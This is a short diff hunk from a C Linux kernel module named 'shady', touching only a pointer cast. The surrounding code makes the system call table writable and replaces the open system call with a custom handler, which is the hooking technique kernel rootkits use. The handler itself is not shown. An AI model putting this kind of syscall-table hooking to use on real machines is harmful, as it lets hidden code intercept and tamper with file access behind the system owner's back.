@@ -233,7 +233,7 @@ shady_init_module(void)
   
   unsigned long *ptr = (unsigned long *)system_call_table_address;
   set_addr_rw(system_call_table_address);
-  old_open = ptr[__NR_open];
+  old_open = (void *)ptr[__NR_open];
   ptr[__NR_open] = (long)my_open;
   
   
